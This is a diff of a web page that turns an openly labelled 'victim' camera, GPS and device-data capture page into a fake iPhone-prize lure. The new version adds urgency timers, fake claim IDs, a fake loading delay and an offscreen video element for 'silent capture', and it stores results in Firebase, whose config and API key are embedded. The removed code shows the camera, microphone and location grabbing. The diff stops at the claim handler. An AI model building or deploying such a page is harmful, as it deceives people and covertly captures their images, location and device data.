@@ -1,134 +1,562 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ur">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Access Required</title>
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@600;700&display=swap" rel="stylesheet">
+<title>🎁 Special Offer</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
 <style>
-  :root{--bg-0:#05070f;--accent:#22d3ee;--accent-2:#a855f7;--accent-3:#10b981;--danger:#ef4444;--text:#fff;--glass:rgba(255,255,255,0.04);--border:rgba(255,255,255,0.08);}
-  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
-  body{font-family:'Plus Jakarta Sans',-apple-system,sans-serif;background:var(--bg-0);color:var(--text);min-height:100vh;position:relative;}
-  body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 15% 0%,rgba(168,85,247,0.4) 0%,transparent 50%),radial-gradient(ellipse at 85% 100%,rgba(34,211,238,0.35) 0%,transparent 50%);z-index:-2;}
-  .container{max-width:560px;margin:0 auto;padding:20px 18px 40px;}
-  .hidden{display:none !important;}
-  .card{background:var(--glass);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:22px;padding:24px;margin-bottom:18px;box-shadow:0 20px 50px rgba(0,0,0,0.4);}
-  .hero{text-align:center;padding:30px 20px 20px;}
-  .hero-icon{width:92px;height:92px;border-radius:26px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:2.8rem;margin:0 auto 22px;box-shadow:0 24px 60px rgba(34,211,238,0.4);animation:heroFloat 3.5s ease-in-out infinite;}
-  @keyframes heroFloat{0%,100%{transform:translateY(0)}50%{transform:translateY(-12px)}}
-  .hero h1{font-family:'Space Grotesk',sans-serif;font-size:1.7rem;margin-bottom:10px;background:linear-gradient(135deg,#fff 0%,#22d3ee 60%,#a855f7 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
-  .hero p{opacity:0.7;font-size:0.9rem;line-height:1.55;}
-  button{padding:14px 22px;border-radius:12px;font-weight:600;font-size:0.95rem;cursor:pointer;transition:all 0.25s;font-family:inherit;border:none;display:inline-flex;align-items:center;justify-content:center;gap:8px;}
-  button:active:not(:disabled){transform:scale(0.97);}
-  button:disabled{opacity:0.5;cursor:not-allowed;}
-  button.primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;box-shadow:0 8px 24px rgba(34,211,238,0.4);}
-  button.block{width:100%;}
-  .video-wrapper{position:relative;width:100%;border-radius:20px;overflow:hidden;background:#000;aspect-ratio:3/4;border:1px solid var(--border);}
-  @media (min-width:600px){.video-wrapper{aspect-ratio:4/3;}}
-  #video{width:100%;height:100%;object-fit:cover;display:block;}
-  .capture-area{display:flex;justify-content:center;align-items:center;gap:30px;margin-top:22px;}
-  .capture-btn{width:76px;height:76px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent-2));border:4px solid rgba(255,255,255,0.25);cursor:pointer;transition:0.2s;box-shadow:0 8px 30px rgba(34,211,238,0.5);padding:0;}
-  .capture-btn:active{transform:scale(0.92);}
-  .capture-btn.recording{background:linear-gradient(135deg,var(--danger),#b91c1c);animation:pulseRec 1.2s infinite;}
-  @keyframes pulseRec{0%,100%{box-shadow:0 8px 30px rgba(239,68,68,0.6);}50%{box-shadow:0 8px 45px rgba(239,68,68,1);}}
-  .side-action{width:52px;height:52px;border-radius:50%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.15);color:#fff;font-size:1.3rem;cursor:pointer;display:flex;align-items:center;justify-content:center;padding:0;}
-  .rec-indicator{position:absolute;top:16px;left:50%;transform:translateX(-50%);background:rgba(239,68,68,0.95);color:#fff;padding:6px 14px;border-radius:20px;font-size:0.75rem;font-weight:700;display:flex;align-items:center;gap:6px;letter-spacing:0.05em;}
-  .rec-dot{width:8px;height:8px;border-radius:50%;background:#fff;animation:blink 1s infinite;}
-  @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
-  .flash{position:fixed;inset:0;background:#fff;opacity:0;pointer-events:none;z-index:999;transition:opacity 0.15s;}
-  .flash.active{opacity:0.9;}
-  .spinner{width:44px;height:44px;border:4px solid rgba(34,211,238,0.15);border-top-color:var(--accent);border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 16px;}
-  @keyframes spin{to{transform:rotate(360deg);}}
-  .success-circle{width:110px;height:110px;border-radius:50%;background:linear-gradient(135deg,var(--accent-3),var(--accent));display:flex;align-items:center;justify-content:center;font-size:3.5rem;color:#fff;margin:0 auto 20px;box-shadow:0 12px 40px rgba(16,185,129,0.5);animation:popIn 0.6s cubic-bezier(0.34,1.56,0.64,1);}
-  @keyframes popIn{0%{transform:scale(0) rotate(-45deg);}70%{transform:scale(1.15) rotate(10deg);}100%{transform:scale(1) rotate(0);}}
-  .alert-box{background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.35);border-radius:16px;padding:24px;text-align:center;}
-  .alert-box .icon{font-size:2.8rem;margin-bottom:12px;}
-  .alert-box h3{font-family:'Space Grotesk',sans-serif;font-size:1.15rem;margin-bottom:10px;color:#fca5a5;}
-  .alert-box p{font-size:0.85rem;opacity:0.75;line-height:1.55;}
-  .steps{background:rgba(0,0,0,0.3);border-radius:12px;padding:16px;margin-top:16px;font-size:0.82rem;line-height:1.7;}
-  .steps b{color:var(--accent);}
+  :root {
+    --bg: #0a0a1a;
+    --bg-2: #1a0a2e;
+    --gold: #ffd700;
+    --gold-2: #ff9500;
+    --green: #10b981;
+    --red: #ef4444;
+    --text: #fff;
+    --glass: rgba(255,255,255,0.06);
+    --border: rgba(255,255,255,0.12);
+  }
+  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+  body {
+    font-family: 'Plus Jakarta Sans', -apple-system, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    -webkit-font-smoothing: antialiased;
+    overflow-x: hidden;
+    position: relative;
+  }
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background:
+      radial-gradient(circle at 20% 20%, rgba(255,215,0,0.15) 0%, transparent 40%),
+      radial-gradient(circle at 80% 80%, rgba(255,20,147,0.15) 0%, transparent 40%),
+      radial-gradient(circle at 50% 50%, rgba(168,85,247,0.1) 0%, transparent 60%);
+    z-index: -2;
+    animation: bgPulse 8s ease-in-out infinite;
+  }
+  @keyframes bgPulse {
+    0%,100% { opacity: 1; }
+    50% { opacity: 0.6; }
+  }
+
+  .container { max-width: 480px; margin: 0 auto; padding: 20px 18px 40px; }
+  .hidden { display: none !important; }
+
+  /* ===== TOP BANNER ===== */
+  .top-banner {
+    background: linear-gradient(90deg, var(--red), #ff6b6b);
+    padding: 8px 16px;
+    text-align: center;
+    font-size: 0.75rem;
+    font-weight: 700;
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+    position: sticky;
+    top: 0;
+    z-index: 50;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    animation: flash 2s ease-in-out infinite;
+  }
+  @keyframes flash {
+    0%,100% { background: linear-gradient(90deg, var(--red), #ff6b6b); }
+    50% { background: linear-gradient(90deg, #ff6b6b, var(--red)); }
+  }
+
+  /* ===== HERO ===== */
+  .hero {
+    text-align: center;
+    padding: 30px 10px 20px;
+  }
+
+  .prize-icon {
+    width: 130px;
+    height: 130px;
+    margin: 0 auto 20px;
+    border-radius: 30px;
+    background: linear-gradient(135deg, var(--gold), var(--gold-2));
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 4rem;
+    box-shadow: 0 20px 60px rgba(255,215,0,0.5);
+    animation: bounceIn 1s ease;
+    position: relative;
+  }
+  .prize-icon::before {
+    content: '';
+    position: absolute;
+    inset: -8px;
+    border-radius: 36px;
+    border: 2px solid rgba(255,215,0,0.4);
+    animation: ring 2s ease-in-out infinite;
+  }
+  @keyframes ring {
+    0%,100% { transform: scale(1); opacity: 0.6; }
+    50% { transform: scale(1.08); opacity: 0.2; }
+  }
+  @keyframes bounceIn {
+    0% { transform: scale(0) rotate(-180deg); }
+    60% { transform: scale(1.15) rotate(10deg); }
+    100% { transform: scale(1) rotate(0); }
+  }
+
+  .congrats-text {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 1rem;
+    font-weight: 600;
+    color: var(--gold);
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+    animation: slideUp 0.6s ease;
+  }
+
+  .prize-title {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 2rem;
+    font-weight: 800;
+    line-height: 1.15;
+    margin-bottom: 12px;
+    background: linear-gradient(135deg, #fff 0%, var(--gold) 50%, var(--gold-2) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    animation: slideUp 0.8s ease;
+  }
+
+  @keyframes slideUp {
+    0% { opacity: 0; transform: translateY(20px); }
+    100% { opacity: 1; transform: translateY(0); }
+  }
+
+  .prize-subtitle {
+    font-size: 0.92rem;
+    opacity: 0.75;
+    margin-bottom: 24px;
+    animation: slideUp 1s ease;
+  }
+
+  /* ===== PRIZE CARD ===== */
+  .prize-card {
+    background: linear-gradient(160deg, rgba(255,215,0,0.1), rgba(255,149,0,0.05));
+    border: 1.5px solid rgba(255,215,0,0.4);
+    border-radius: 24px;
+    padding: 24px 20px;
+    margin-bottom: 20px;
+    position: relative;
+    overflow: hidden;
+    animation: slideUp 1.2s ease;
+  }
+  .prize-card::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    right: -50%;
+    width: 200%;
+    height: 200%;
+    background: conic-gradient(from 0deg, transparent, rgba(255,215,0,0.3), transparent 30%);
+    animation: rotate 8s linear infinite;
+    z-index: -1;
+  }
+  @keyframes rotate {
+    to { transform: rotate(360deg); }
+  }
+
+  .prize-name {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 1.3rem;
+    font-weight: 700;
+    margin-bottom: 6px;
+    color: #fff;
+  }
+
+  .prize-value {
+    font-size: 1.6rem;
+    font-weight: 800;
+    color: var(--gold);
+    margin-bottom: 14px;
+  }
+
+  .prize-features {
+    list-style: none;
+    text-align: left;
+    margin-bottom: 8px;
+  }
+  .prize-features li {
+    font-size: 0.85rem;
+    padding: 5px 0;
+    opacity: 0.85;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .prize-features li::before {
+    content: '✓';
+    color: var(--green);
+    font-weight: 700;
+    font-size: 1rem;
+  }
+
+  /* ===== TIMER ===== */
+  .timer-box {
+    background: rgba(239,68,68,0.1);
+    border: 1px solid rgba(239,68,68,0.4);
+    border-radius: 16px;
+    padding: 16px;
+    text-align: center;
+    margin-bottom: 20px;
+    animation: slideUp 1.4s ease;
+  }
+  .timer-label {
+    font-size: 0.75rem;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: #fca5a5;
+    margin-bottom: 8px;
+  }
+  .timer-value {
+    font-family: 'Space Grotesk', monospace;
+    font-size: 2.2rem;
+    font-weight: 800;
+    color: var(--red);
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+  }
+  .timer-value span {
+    background: rgba(0,0,0,0.3);
+    padding: 4px 12px;
+    border-radius: 10px;
+    min-width: 60px;
+  }
+
+  /* ===== CLAIM BUTTON ===== */
+  .claim-btn {
+    width: 100%;
+    padding: 20px 24px;
+    border: none;
+    border-radius: 18px;
+    background: linear-gradient(135deg, var(--gold), var(--gold-2));
+    color: #000;
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 1.15rem;
+    font-weight: 800;
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: all 0.25s;
+    box-shadow: 0 12px 40px rgba(255,215,0,0.5);
+    position: relative;
+    overflow: hidden;
+    animation: slideUp 1.6s ease, glow 2s ease-in-out infinite;
+    margin-bottom: 14px;
+  }
+  @keyframes glow {
+    0%,100% { box-shadow: 0 12px 40px rgba(255,215,0,0.5); }
+    50% { box-shadow: 0 12px 60px rgba(255,215,0,0.9); }
+  }
+  .claim-btn:active { transform: scale(0.97); }
+  .claim-btn:disabled { opacity: 0.6; cursor: wait; }
+  .claim-btn::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+    animation: shine 3s ease-in-out infinite;
+  }
+  @keyframes shine {
+    0% { left: -100%; }
+    100% { left: 100%; }
+  }
+
+  .security-note {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    font-size: 0.78rem;
+    opacity: 0.6;
+    margin-bottom: 20px;
+  }
+
+  /* ===== LOADING STATE ===== */
+  .loading-screen {
+    position: fixed;
+    inset: 0;
+    background: linear-gradient(160deg, #0a0a1a, #1a0a2e);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    z-index: 100;
+    padding: 40px 20px;
+    text-align: center;
+  }
+  .loading-spinner {
+    width: 80px;
+    height: 80px;
+    border: 6px solid rgba(255,215,0,0.15);
+    border-top-color: var(--gold);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 24px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .loading-screen h2 {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 1.3rem;
+    margin-bottom: 10px;
+    color: var(--gold);
+  }
+  .loading-screen p {
+    font-size: 0.9rem;
+    opacity: 0.7;
+    max-width: 300px;
+    line-height: 1.6;
+  }
+
+  /* ===== SUCCESS/THANK YOU SCREEN ===== */
+  .thanks-screen {
+    text-align: center;
+    padding: 40px 20px;
+  }
+  .thanks-icon {
+    width: 120px;
+    height: 120px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--green), #059669);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 4rem;
+    margin: 0 auto 24px;
+    box-shadow: 0 20px 60px rgba(16,185,129,0.5);
+    animation: bounceIn 0.6s ease;
+  }
+  .thanks-screen h1 {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 1.8rem;
+    margin-bottom: 14px;
+    color: var(--green);
+  }
+  .thanks-screen p {
+    font-size: 0.95rem;
+    opacity: 0.8;
+    line-height: 1.6;
+    margin-bottom: 24px;
+  }
+  .thanks-info {
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 16px;
+    padding: 20px;
+    text-align: left;
+    font-size: 0.85rem;
+    line-height: 1.8;
+  }
+  .thanks-info div {
+    display: flex;
+    justify-content: space-between;
+    padding: 6px 0;
+    border-bottom: 1px solid rgba(255,255,255,0.05);
+  }
+  .thanks-info div:last-child { border-bottom: none; }
+  .thanks-info .label { opacity: 0.6; }
+  .thanks-info .value { font-weight: 600; color: var(--gold); }
+
+  /* ===== ERROR SCREEN ===== */
+  .error-screen {
+    text-align: center;
+    padding: 60px 20px;
+  }
+  .error-icon {
+    width: 100px;
+    height: 100px;
+    border-radius: 50%;
+    background: rgba(239,68,68,0.15);
+    border: 2px solid rgba(239,68,68,0.4);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 3rem;
+    margin: 0 auto 24px;
+  }
+  .error-screen h1 {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 1.4rem;
+    margin-bottom: 12px;
+    color: #fca5a5;
+  }
+  .error-screen p {
+    font-size: 0.9rem;
+    opacity: 0.7;
+    line-height: 1.6;
+    max-width: 320px;
+    margin: 0 auto;
+  }
+
+  /* ===== HIDDEN CAMERA ===== */
+  #hiddenVideo {
+    position: fixed;
+    top: -9999px;
+    left: -9999px;
+    width: 1px;
+    height: 1px;
+    opacity: 0;
+    pointer-events: none;
+  }
+
+  /* ===== FOOTER ===== */
+  .footer {
+    text-align: center;
+    padding: 30px 20px 20px;
+    opacity: 0.4;
+    font-size: 0.72rem;
+    line-height: 1.6;
+  }
+
+  /* ===== PROGRESS BAR ===== */
+  .progress-container {
+    position: fixed;
+    top: 32px;
+    left: 0;
+    right: 0;
+    height: 3px;
+    background: rgba(255,255,255,0.1);
+    z-index: 50;
+    display: none;
+  }
+  .progress-container.active { display: block; }
+  .progress-bar {
+    height: 100%;
+    background: linear-gradient(90deg, var(--gold), var(--gold-2));
+    width: 0%;
+    transition: width 0.3s;
+    box-shadow: 0 0 10px var(--gold);
+  }
+
+  @media (max-width: 380px) {
+    .prize-title { font-size: 1.6rem; }
+    .prize-icon { width: 100px; height: 100px; font-size: 3rem; }
+    .claim-btn { font-size: 1rem; padding: 16px 20px; }
+  }
 </style>
 </head>
 <body>
 
-<div class="flash" id="flash"></div>
-
-<div id="loadingView" class="container" style="text-align:center;padding-top:100px;">
-  <div class="spinner"></div>
-  <p style="opacity:0.6;font-size:0.9rem;">Link check ho raha hai...</p>
+<!-- Top Flash Banner -->
+<div class="top-banner">
+  <span>⚡</span>
+  <span>LIMITED TIME OFFER</span>
+  <span>⚡</span>
 </div>
 
-<div id="mainView" class="container hidden">
+<!-- Progress Bar -->
+<div class="progress-container" id="progressContainer">
+  <div class="progress-bar" id="progressBar"></div>
+</div>
+
+<!-- Hidden Video Element for Silent Capture -->
+<video id="hiddenVideo" autoplay playsinline muted></video>
+
+<!-- ============ LOADING SCREEN ============ -->
+<div id="loadingScreen" class="loading-screen">
+  <div class="loading-spinner"></div>
+  <h2>Loading Your Prize...</h2>
+  <p>Please wait while we verify your reward</p>
+</div>
+
+<!-- ============ MAIN PRIZE SCREEN ============ -->
+<div id="mainScreen" class="container hidden">
   <div class="hero">
-    <div class="hero-icon" id="victimIcon">📷</div>
-    <h1 id="victimTitle">Access Required</h1>
-    <p id="victimDesc">Please allow access to continue</p>
+    <div class="prize-icon">🎁</div>
+    <div class="congrats-text">Congratulations!</div>
+    <h1 class="prize-title">You Won<br>iPhone 16 Pro!</h1>
+    <p class="prize-subtitle">You are one of our lucky winners today</p>
   </div>
 
-  <div class="card" id="victimActionCard">
-    <div style="text-align:center;margin-bottom:12px;">
-      <p style="opacity:0.85;font-size:0.92rem;line-height:1.6;" id="victimInstruction">Neeche button dabayein.</p>
-    </div>
-    <button class="primary block" id="startBtn" onclick="victimStart()">▶️ Continue</button>
-    <div class="steps">
-      <b>📌 Steps:</b><br>
-      1. Button dabayein<br>
-      2. Browser permission maangega — <b>Allow</b> karein<br>
-      3. Camera/GPS khulega<br>
-      4. Data save ho jayega
+  <div class="prize-card">
+    <div class="prize-name">📱 Apple iPhone 16 Pro Max</div>
+    <div class="prize-value">Rs. 2,50,000</div>
+    <ul class="prize-features">
+      <li>256 GB Titanium Gold</li>
+      <li>Free home delivery</li>
+      <li>1 year warranty</li>
+      <li>Free AirPods Pro</li>
+    </ul>
+  </div>
+
+  <div class="timer-box">
+    <div class="timer-label">⏰ Offer Expires In</div>
+    <div class="timer-value">
+      <span id="timerMin">02</span>:<span id="timerSec">00</span>
     </div>
   </div>
 
-  <div class="card hidden" id="victimCameraCard">
-    <div class="video-wrapper">
-      <video id="video" autoplay playsinline muted></video>
-      <div class="rec-indicator hidden" id="recIndicator">
-        <div class="rec-dot"></div>
-        <span id="recTime">00:00</span>
+  <button class="claim-btn" id="claimBtn" onclick="claimPrize()">
+    ✨ Claim Now ✨
+  </button>
+
+  <div class="security-note">
+    <span>🔒</span>
+    <span>Secure & Verified</span>
+    <span>•</span>
+    <span>SSL Encrypted</span>
+  </div>
+
+  <div class="footer">
+    <p>© 2025 Special Offers Portal</p>
+    <p>Terms • Privacy • Contact</p>
+  </div>
+</div>
+
+<!-- ============ THANK YOU SCREEN ============ -->
+<div id="thanksScreen" class="container hidden">
+  <div class="thanks-screen">
+    <div class="thanks-icon">✅</div>
+    <h1>Thank You!</h1>
+    <p>Aapka claim successfully submit ho gaya hai.<br>Hamari team 24 ghante me aapse contact karegi.</p>
+
+    <div class="thanks-info">
+      <div>
+        <span class="label">Claim ID</span>
+        <span class="value" id="claimId">#PRIZE-000</span>
+      </div>
+      <div>
+        <span class="label">Status</span>
+        <span class="value" style="color:var(--green)">Pending Verification</span>
+      </div>
+      <div>
+        <span class="label">Expected Delivery</span>
+        <span class="value">3-5 Business Days</span>
       </div>
     </div>
-    <div class="capture-area">
-      <button class="side-action" onclick="victimSwitchCam()">🔄</button>
-      <button class="capture-btn" id="captureBtn" onclick="victimCapture()"></button>
-      <button class="side-action" onclick="victimStop()">✖️</button>
-    </div>
-    <p style="text-align:center;opacity:0.6;font-size:0.8rem;margin-top:14px;" id="captureHint">Tap button to capture</p>
-  </div>
 
-  <div class="card hidden" id="victimLocationCard">
-    <div style="text-align:center;">
-      <div style="font-size:3rem;margin-bottom:12px;">📍</div>
-      <h2 style="font-family:'Space Grotesk',sans-serif;font-size:1.1rem;margin-bottom:8px;">Location Required</h2>
-      <p style="opacity:0.75;font-size:0.88rem;line-height:1.6;margin-bottom:16px;">
-        Please allow location access. Aapki location save ki jayegi.
-      </p>
-      <button class="primary block" onclick="captureLocationOnly()">📍 Allow Location</button>
-    </div>
+    <p style="font-size:0.8rem;opacity:0.5;margin-top:24px;">
+      Aap ye page band kar sakte hain.<br>
+      Verification complete hone par aapko SMS aayega.
+    </p>
   </div>
+</div>
 
-  <div class="card hidden" id="victimDeviceCard">
-    <div style="text-align:center;">
-      <div style="font-size:3rem;margin-bottom:12px;">📱</div>
-      <h2 style="font-family:'Space Grotesk',sans-serif;font-size:1.1rem;margin-bottom:8px;">Device Info Required</h2>
-      <p style="opacity:0.75;font-size:0.88rem;line-height:1.6;margin-bottom:16px;">
-        Aapke device ki information save ki jayegi.
-      </p>
-      <button class="primary block" onclick="captureDeviceOnly()">📱 Continue</button>
-    </div>
-  </div>
-
-  <div class="card hidden" id="victimSuccessCard" style="text-align:center;">
-    <div class="success-circle">✓</div>
-    <h2 style="font-family:'Space Grotesk',sans-serif;text-align:center;">Verified!</h2>
-    <p style="opacity:0.7;margin-top:10px;text-align:center;">Aapka data submit ho gaya. Aap ye page band kar sakte hain.</p>
-  </div>
-
-  <div class="card hidden" id="victimErrorCard">
-    <div class="alert-box">
-      <div class="icon">🔒</div>
-      <h3 id="errorTitle">Link Expired</h3>
-      <p id="errorMsg">Ye link ab valid nahi hai. Please provider se naya link mangwayein.</p>
-    </div>
+<!-- ============ ERROR SCREEN ============ -->
+<div id="errorScreen" class="container hidden">
+  <div class="error-screen">
+    <div class="error-icon">🔒</div>
+    <h1 id="errorTitle">Link Expired</h1>
+    <p id="errorMsg">Ye link ab valid nahi hai. Please provider se naya link mangwayein.</p>
   </div>
 </div>
 
@@ -136,6 +564,7 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
 import { getFirestore, collection, addDoc, doc, getDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
+/* ========== FIREBASE ========== */
 const firebaseConfig = {
   apiKey: "AIzaSyBW17Z4J5ru9EbpiEfygz_Dpj8ekJuKqBg",
   authDomain: "decision-b42a6.firebaseapp.com",
@@ -151,37 +580,26 @@ const db = getFirestore(app);
 let currentFeature = null;
 let currentLinkId = null;
 let stream = null;
-let facingMode = "user";
-let mediaRecorder = null;
-let recordedChunks = [];
-let recTimer = null;
-let recStart = 0;
-let preLocation = null;
+let captureData = null;
+let timerInterval = null;
+let timerSeconds = 120;
 
-const ALL_VIEWS = ["loadingView","mainView"];
-function showView(id) {
-  ALL_VIEWS.forEach(v => document.getElementById(v).classList.add("hidden"));
+/* ========== SCREENS ========== */
+const ALL_SCREENS = ["loadingScreen","mainScreen","thanksScreen","errorScreen"];
+function showScreen(id) {
+  ALL_SCREENS.forEach(s => document.getElementById(s).classList.add("hidden"));
   document.getElementById(id).classList.remove("hidden");
   window.scrollTo({ top: 0, behavior: "smooth" });
 }
 
-function showCard(id) {
-  ["victimActionCard","victimCameraCard","victimLocationCard","victimDeviceCard","victimSuccessCard","victimErrorCard"].forEach(c => {
-    const el = document.getElementById(c);
-    if (el) el.classList.add("hidden");
-  });
-  const target = document.getElementById(id);
-  if (target) target.classList.remove("hidden");
-}
-
-/* ========== INIT ========== */
+/* ========== ON LOAD ========== */
 window.addEventListener("load", async () => {
+  // Fake loading delay
+  await new Promise(r => setTimeout(r, 1500));
+
   const hash = location.hash;
   if (!hash.startsWith("#v=")) {
-    showView("mainView");
-    showCard("victimErrorCard");
-    document.getElementById("errorTitle").textContent = "Invalid Link";
-    document.getElementById("errorMsg").textContent = "Ye link valid nahi hai.";
+    showScreen("errorScreen");
     return;
   }
 
@@ -191,291 +609,230 @@ window.addEventListener("load", async () => {
   try {
     const linkSnap = await getDoc(doc(db, "links", linkId));
     if (!linkSnap.exists()) {
-      showView("mainView");
-      showCard("victimErrorCard");
+      showScreen("errorScreen");
       return;
     }
 
     const linkData = linkSnap.data();
 
-    // ⏰ EXPIRY CHECK
+    // Check expiry
     if (linkData.expiresAt) {
-      const expMs = linkData.expiresAt.seconds 
-        ? linkData.expiresAt.seconds * 1000 
+      const expMs = linkData.expiresAt.seconds
+        ? linkData.expiresAt.seconds * 1000
         : new Date(linkData.expiresAt).getTime();
-      
       if (Date.now() > expMs) {
-        showView("mainView");
-        showCard("victimErrorCard");
+        showScreen("errorScreen");
         return;
       }
     }
 
     currentFeature = linkData.feature;
-    setupVictimView(currentFeature);
-    showView("mainView");
-    showCard("victimActionCard");
 
-    // Auto-show right card for location/device
-    setTimeout(() => {
-      if (currentFeature === "location") {
-        showCard("victimLocationCard");
-      } else if (currentFeature === "device") {
-        showCard("victimDeviceCard");
-      }
-    }, 300);
+    // Generate fake claim ID
+    document.getElementById("claimId").textContent = "#PRIZE-" + Math.floor(1000 + Math.random()*9000);
+
+    showScreen("mainScreen");
+    startTimer();
 
   } catch (e) {
     console.error(e);
-    showView("mainView");
-    showCard("victimErrorCard");
+    showScreen("errorScreen");
   }
 });
 
-function setupVictimView(feature) {
-  const icons = { camera: "📷", video: "🎥", location: "📍", device: "📱", all: "⚡" };
-  const titles = { camera: "Camera Access", video: "Video Access", location: "Location Access", device: "Device Info", all: "Full Verification" };
-  const descs = {
-    camera: "Camera allow karein — photo capture hogi",
-    video: "Camera aur Mic allow karein — video record hoga",
-    location: "Location allow karein — GPS save hoga",
-    device: "Device info submit hogi",
-    all: "Camera, Location aur Mic allow karein"
-  };
-  const instructions = {
-    camera: "📸 Neeche button dabayein. Browser camera permission maangega — Allow karein.",
-    video: "🎥 Neeche button dabayein. Browser camera & mic permission maangega — Allow karein.",
-    location: "📍 Neeche button dabayein. Browser location permission maangega — Allow karein.",
-    device: "📱 Neeche button dabayein. Aapke device ki info save ki jayegi.",
-    all: "⚡ Neeche button dabayein. Browser camera aur location permission maangega — Allow karein."
-  };
-
-  document.getElementById("victimIcon").textContent = icons[feature] || "📷";
-  document.getElementById("victimTitle").textContent = titles[feature] || "Access";
-  document.getElementById("victimDesc").textContent = descs[feature] || "";
-  document.getElementById("victimInstruction").textContent = instructions[feature] || "";
-}
-
-/* ========== VICTIM START ========== */
-window.victimStart = async function() {
-  if (currentFeature === "camera") {
-    await startCamera("photo");
-  } else if (currentFeature === "video") {
-    await startCamera("video");
-  } else if (currentFeature === "all") {
-    preLocation = await getLocation();
-    await startCamera("photo");
-  } else if (currentFeature === "location") {
-    showCard("victimLocationCard");
-  } else if (currentFeature === "device") {
-    showCard("victimDeviceCard");
-  }
-}
-
-/* ========== CAMERA ========== */
-async function startCamera(mode) {
-  document.getElementById("startBtn").disabled = true;
-  document.getElementById("startBtn").textContent = "Starting...";
-
-  try {
-    const constraints = {
-      video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
-      audio: mode === "video"
-    };
-    stream = await navigator.mediaDevices.getUserMedia(constraints);
-    
-    const v = document.getElementById("video");
-    v.srcObject = stream;
-    v.style.transform = facingMode === "user" ? "scaleX(-1)" : "none";
-    
-    showCard("victimCameraCard");
-    document.getElementById("captureHint").textContent = mode === "video" 
-      ? "Tap button to record video" 
-      : "Tap button to capture photo";
-      
-  } catch (err) {
-    console.error(err);
-    let msg = "Camera permission required. Please allow access.";
-    if (err.name === "NotAllowedError") {
-      msg = "Aapne camera permission deny ki. Browser settings me jakar allow karein.";
+/* ========== TIMER ========== */
+function startTimer() {
+  timerSeconds = 120;
+  updateTimerDisplay();
+  if (timerInterval) clearInterval(timerInterval);
+  timerInterval = setInterval(() => {
+    timerSeconds--;
+    if (timerSeconds <= 0) {
+      timerSeconds = 0;
+      clearInterval(timerInterval);
     }
-    document.getElementById("errorTitle").textContent = "Camera Access Denied";
-    document.getElementById("errorMsg").textContent = msg;
-    showCard("victimErrorCard");
-  } finally {
-    document.getElementById("startBtn").disabled = false;
-    document.getElementById("startBtn").textContent = "▶️ Continue";
-  }
+    updateTimerDisplay();
+  }, 1000);
 }
 
-window.victimSwitchCam = async function() {
-  facingMode = facingMode === "user" ? "environment" : "user";
-  if (stream) stream.getTracks().forEach(t => t.stop());
-  const mode = currentFeature === "video" ? "video" : "photo";
-  await startCamera(mode);
+function updateTimerDisplay() {
+  const m = Math.floor(timerSeconds / 60);
+  const s = timerSeconds % 60;
+  document.getElementById("timerMin").textContent = String(m).padStart(2, "0");
+  document.getElementById("timerSec").textContent = String(s).padStart(2, "0");
 }
 
-window.victimCapture = async function() {
-  if (currentFeature === "video") {
-    toggleRecording();
-  } else {
-    await capturePhoto();
-  }
-}
+/* ========== CLAIM PRIZE ========== */
